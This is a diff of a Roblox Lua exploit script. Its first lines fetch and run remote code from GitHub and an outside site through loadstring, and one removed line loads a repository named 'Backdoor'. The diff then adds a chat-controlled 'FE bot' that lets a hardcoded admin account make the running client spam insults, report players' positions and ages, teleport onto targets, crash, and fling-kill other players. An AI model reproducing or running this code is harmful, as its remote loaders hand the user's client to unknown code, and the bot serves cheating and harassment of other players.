@@ -1,7 +1,272 @@
-wait(1)
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/hhhhhhhhhhhhhhhhhhhhhhhok/main/readme.md",true))()
 wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/Backdoor",true))()
-wait(1)
 loadstring(((syn and syn.request) or request or http_request)({Url = "https://www.stenutilities.com/babft"})["Body"])()
+wait(1)
+local settings = {
+	admin = "uwutimmyreborn228",
+	prefix = ".",
+	announce_on_execute = false
+}
+--[[
+	Thanks for using Tostrong Fe Bot.
+	Made by tostring on v3rm
+	Modded by Babyhamsta on v3rm
+
+	Babyhamsta Changes:
+	Added multi command for ws, jp, jump, and sit.
+	Added short names
+	Added string.lower so you can type with caps and lowers
+	Changed all commands to work with short names
+	
+	Commands:
+	print = prints what you want in console on the bot. Example: [PREFIX IN SETTINGS]print hello world
+	bringbot/bring = brings the bot to the admin. Example: [PREFIX IN SETTINGS]bring
+	killbot = kills the bot so it can respawn, do not use if fe godded. Example: [PREFIX IN SETTINGS]killbot
+	wsbot/ws = allows you to select the amount of walkspeed for the bot. Example: [PREFIX IN SETTINGS]ws 100
+	jpbot/jp = allows you to select the amount of JumpPower for the bot. Example: [PREFIX IN SETTINGS]jp 100
+	jumpbot/jump = makes the bot jump. Example: [PREFIX IN SETTINGS]jump
+	sitbot/sit = makes the bot sit, use jumpbot to make it jump. Example: [PREFIX IN SETTINGS]sit
+	fegod = Makes the bot godded. Example: [PREFIX IN SETTINGS]fegod
+	come = Alterinative to bringbot
+	freeze = Freezes the bot in place, use [PREFIX IN SETTINGS]unfreeze to unfreeze. Example: [PREFIX IN SETTINGS]freeze
+	age = finds age of selected player. Example: [PREFIX IN SETTINGS]age GordonRamsay
+	findbot = Makes the bot chat their current position. Example: [PREFIX IN SETTINGS]findbot
+	find = Makes the bot chat the targets current position. Example: [PREFIX IN SETTINGS]find GordonRamsay
+	say = says a message that you set it to say. Example: [PREFIX IN SETTINGS]say hello world
+	players = will make the bot chat all the existing players names. Example: [PREFIX IN SETTINGS]players
+	shutdown = makes the bot leave the game and shutdown. Example: [PREFIX IN SETTINGS]shutdown
+	status = Makes the bot chat its health and position. Example: [PREFIX IN SETTINGS]status
+	plrlog = Chats the name of players that join the game, use [PREFIX IN SETTINGS]endplrlog to stop it. Example: [PREFIX IN SETTINGS]plrlog
+	joke = Chats a random joke. Example: [PREFIX IN SETTINGS]joke
+	tp = makes the bot tp to the target. Example: [PREFIX IN SETTINGS]tp GordonRamsay
+	crashbot = Makes the bot crash and unresponsive. Example: [PREFIX IN SETTINGS]crashbot
+	random = chats a random number. Example: [PREFIX IN SETTINGS]random
+	wander = makes the bot wander around in a random direction. Example: [PREFIX IN SETTINGS]wander
+	intofplayers = Makes the bot chat the number of players in game. Example: [PREFIX IN SETTINGS]intofplayers
+	insane = makes the bot play the insane animation. Example: [PREFIX IN SETTINGS]insane
+	dab = makes the bot play the dab animation. Example: [PREFIX IN SETTINGS]dab
+	attach = makes the bot loop tp to the selected target. Example: [PREFIX IN SETTINGS]attach GordonRamsay
+	hover = makes the bot loop tp above the selected target. Example: [PREFIX IN SETTINGS]hover GordonRamsay
+	insult = makes the bot chat a random insult. Example: [PREFIX IN SETTINGS]insult
+	rstring = makes the bot chat random characters. Example: [PREFIX IN SETTINGS]rstring
+	fps = makes the bot chat its current fps. Example: [PREFIX IN SETTINGS]fps
+	kill = makes the bot kill the selected target, you must have a tool though. Example: [PREFIX IN SETTINGS]kill GordonRamsay
+	nolimbs = gets rid of the bots limbs. Example: [PREFIX IN SETTINGS]nolimbs
+--]]
+local plrs = game:GetService("Players")
+local plr = plrs.LocalPlayer
+local admin = plrs:WaitForChild(settings.admin, math.huge)
+local plrlog = false
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+local prefix = settings.prefix
+local out
+local jokes = {
+	"What type of cloud is so lazy, because it will never get up? Fog!",
+	"Why was the belt sent to jail? For holding up a pair of pants!"
+}
+local insults = {
+	"Go to bed.",
+	"You need a shower.",
+	"I don't use grammar just to work at frappe like you.",
+	"oder alert.",
+	"What a poor free robux outfit EW!",
+	"Go away noob.",
+	"No.",
+	"Never in your lifetime.",
+	"You look like you just turned into a zombie and a ugly monster.",
+	"Rich items don't grant you actual fame.",
+	"You play roblox to od. Not for the fun or for the scripting or exploiting.",
+	"Pathetic.",
+	"It mustve took you two hours to make a account on this site huh? Not to mention your email.",
+	"... The reason I am so silent is because you look so ugly.",
+	"Do you even go to school?",
+	"You need to go to insulting school if you need a bot to make one for you. :)",
+	"Will you stop using me just for insults?",
+	"Bruh, I can't even say anything because of how much of a abomination you are.",
+	"You probably can't even pick up girls because of how much you torture them.",
+	"your mum."
+}
+
+if settings.announce_on_execute == true then
+	Event:FireServer("Bot has been initialized, Prefix: " .. prefix, "All")
+end
+
+function genrandom()
+	out = string.char(math.random(97,123)) .. string.char(math.random(97,123)) .. string.char(math.random(97,123)) .. string.char(math.random(97,123)) .. string.char(math.random(97,123)) .. string.char(math.random(97,123))
+end
+
+function getname(target) --Gets player from shortend username (Babyhamsta)
+	local children = game.Players:GetChildren()
+	for i = 1, #children do
+		local child = string.lower(tostring(children[i].Name))
+		local look = tostring(target)
+    	if string.find(child, look) then
+			found = children[i].Name
+		end
+	end
+	return found;
+end
+
+admin.Chatted:Connect(function(chtt)
+	local cht = string.lower(chtt) --(Babyhamsta)
+	if cht:match(prefix .. "print") then
+		print(cht:sub(8))
+	elseif cht:match(prefix .. "bringbot") or cht:match(prefix .. "bring") then
+		plr.Character.HumanoidRootPart.CFrame = admin.Character.Head.CFrame
+	elseif cht:match(prefix .. "killbot") then
+		plr.Character.Humanoid.Health = 0
+	elseif cht:match(prefix .. "wsbot") or cht:match(prefix .. "ws") then
+		plr.Character.Humanoid.WalkSpeed = cht:sub(8)
+	elseif cht:match(prefix .. "jpbot") or cht:match(prefix .. "jp") then
+		plr.Character.Humanoid.JumpPower = cht:sub(8)
+	elseif cht:match(prefix .. "jumpbot") or cht:match(prefix .. "jump") then
+		plr.Character.Humanoid.Jump = true
+	elseif cht:match(prefix .. "sitbot") or cht:match(prefix .. "sit") then
+		plr.Character.Humanoid.Sit = true
+	elseif cht:match(prefix .. "fegod") then
+		plr.Character.Humanoid:Destroy()
+		wait()
+		Instance.new("Humanoid",plr.Character)
+	elseif cht:match(prefix .. "come") then
+		plr.Character.Humanoid:MoveTo(admin.Character.HumanoidRootPart.Position)
+	elseif cht:match(prefix .. "freeze") then
+		plr.Character.HumanoidRootPart.Anchored = true
+	elseif cht:match(prefix .. "unfreeze") then
+		plr.Character.HumanoidRootPart.Anchored = false
+	elseif cht:match(prefix .. "age") then
+		local age = plrs[cht:sub(6)].AccountAge
+		Event:FireServer(tostring(age), "All")
+	elseif cht:match(prefix .. "findbot") then
+		local pos = plr.Character.HumanoidRootPart.Position
+		Event:FireServer(tostring(pos), "All")
+	elseif cht:match(prefix .. "find") then
+		local target = getname(cht:sub(7))
+		local pos = plrs[target].Character.HumanoidRootPart.Position
+		Event:FireServer(tostring(pos), "All")
+	elseif cht:match(prefix .. "say") then
+		Event:FireServer(tostring(cht:sub(6)), "All")
+	elseif cht:match(prefix .. "players") then
+		for _,v in next, plrs:GetPlayers() do
+			Event:FireServer(tostring(v.Name), "All")
+			wait(1)
+		end
+	elseif cht:match(prefix .. "shutdown") then
+		Event:FireServer("Leaving the game now, goodbye!", "All")
+		wait()
+		game:Shutdown()
+	elseif cht:match(prefix .. "status") then
+		local health = plr.Character.Humanoid.Health
+		local pos = plr.Character.HumanoidRootPart.Position
+		Event:FireServer("Health: " .. health, "All")
+		Event:FireServer("Position:","All")
+		Event:FireServer(tostring(pos),"All")
+	elseif cht:match(prefix .. "plrlog") then
+		plrlog = true
+	elseif cht:match(prefix .. "endplrlog") then
+		plrlog = false
+	elseif cht:match(prefix .. "joke") then
+		Event:FireServer(jokes[math.random(1,4)],"All")
+	elseif cht:match(prefix .. "tp") then
+		local target = getname(cht:sub(5))
+		plr.Character.HumanoidRootPart.CFrame = plrs[target].Character.HumanoidRootPart.CFrame
+	elseif cht:match(prefix .. "crashbot") or cht:match(prefix .. "crash") then
+		while true do end
+	elseif cht:match(prefix .. "random") then
+		Event:FireServer(tostring(math.random()), "All")
+	elseif cht:match(prefix .. "wander") then
+		local chance = math.random(1,4)
+		if chance == 1 then
+			local pos = Vector3.new(plr.Character.HumanoidRootPart.Position.X + math.random(1,50), plr.Character.HumanoidRootPart.Position.Y, plr.Character.HumanoidRootPart.Position.Z - math.random(1,50))
+			plr.Character.Humanoid:MoveTo(pos)
+		elseif chance == 2 then
+			local pos = Vector3.new(plr.Character.HumanoidRootPart.Position.X - math.random(1,50), plr.Character.HumanoidRootPart.Position.Y, plr.Character.HumanoidRootPart.Position.Z + math.random(1,50))
+			plr.Character.Humanoid:MoveTo(pos)
+		elseif chance == 3 then
+			local pos = Vector3.new(plr.Character.HumanoidRootPart.Position.X - math.random(1,50), plr.Character.HumanoidRootPart.Position.Y, plr.Character.HumanoidRootPart.Position.Z - math.random(1,50))
+			plr.Character.Humanoid:MoveTo(pos)
+		elseif chance == 4 then
+			local pos = Vector3.new(plr.Character.HumanoidRootPart.Position.X + math.random(1,50), plr.Character.HumanoidRootPart.Position.Y, plr.Character.HumanoidRootPart.Position.Z + math.random(1,50))
+			plr.Character.Humanoid:MoveTo(pos)
+		end
+	elseif cht:match(prefix .. "intofplayers") or cht:match(prefix .. "players") then
+		local amount = 0
+		for _,v in next, plrs:GetPlayers() do
+			amount = amount + 1
+		end
+		Event:FireServer(tostring("Number of players: " .. amount), "All")
+		amount = 0
+	elseif cht:match(prefix .. "insane") then
+		local AnimationId = "33796059"
+		local Anim = Instance.new("Animation")
+		Anim.AnimationId = "rbxassetid://"..AnimationId
+		local k = plr.Character.Humanoid:LoadAnimation(Anim)
+		k:Play()
+		k:AdjustSpeed(90)
+	elseif cht:match(prefix .. "dab") then
+		local AnimationId = "248263260"
+		local Anim = Instance.new("Animation")
+		Anim.AnimationId = "rbxassetid://"..AnimationId
+		local k = plr.Character.Humanoid:LoadAnimation(Anim)
+		k:Play()
+		k:AdjustSpeed(1)
+	elseif cht:match(prefix .. "attach") then
+		local target = getname(cht:sub(9))
+		while wait() do
+			plr.Character.HumanoidRootPart.CFrame = plrs[target].Character.HumanoidRootPart.CFrame
+			if plr.Character.Humanoid.Health == 0 or not plr.Character:FindFirstChild("HumanoidRootPart") or not plrs[target].Character:FindFirstChild("HumanoidRootPart") then
+				break
+			end
+		end
+	elseif cht:match(prefix .. "hover") then
+		local target = getname(cht:sub(8))
+		while wait() do
+			if plr.Character.Humanoid.Health == 0 or not plr.Character:FindFirstChild("HumanoidRootPart") or not plrs[target].Character:FindFirstChild("HumanoidRootPart") then
+				break
+			end
+			plr.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(plrs[target].Character.HumanoidRootPart.Position.X, plrs[target].Character.HumanoidRootPart.Position.Y + 12, plrs[target].Character.HumanoidRootPart.Position.Z))
+		end
+	elseif cht:match(prefix .. "insult") then
+		Event:FireServer(insults[math.random(1,20)], "All")
+	elseif cht:match(prefix .. "rstring") then
+		genrandom()
+		Event:FireServer(tostring(out), "All")
+	elseif cht:match(prefix .. "fps") then
+		local FPS = workspace:GetRealPhysicsFPS()
+		Event:FireServer("Bots current FPS: " .. math.floor(FPS),"All")
+	elseif cht:match(prefix .. "kill") then
+		-- illremember's cool fe kill script, took this from IY since I was too lazy to make my own so thanks for it.
+		local target = getname(cht:sub(7))
+		game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
+		local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
+		l.Parent = game:GetService("Players").LocalPlayer.Character
+		l.Name = "Humanoid"
+		wait(0.1)
+		game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
+		game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
+		game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
+		wait(0.1)
+		game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
+		game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
+		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
+			game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
+			v.CanBeDropped = true
+		end
+		wait(0.1)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = plrs[target].Character.HumanoidRootPart.CFrame
+		wait(0.1)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = plrs[target].Character.HumanoidRootPart.CFrame
+		wait(0.2)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-10000,-100, -10000))
+	elseif cht:match(prefix .. "nolimbs") then
+		plr.Character["Left Leg"]:Destroy()
+		plr.Character["Right Leg"]:Destroy()
+		plr.Character["Left Arm"]:Destroy()
+		plr.Character["Right Arm"]:Destroy()
+	end
+end)
+
+plrs.PlayerAdded:Connect(function(noob)
+	if plrlog == true then
+		Event:FireServer(tostring(noob.Name) .. " has joined the game.", "All")
+	end
+end)
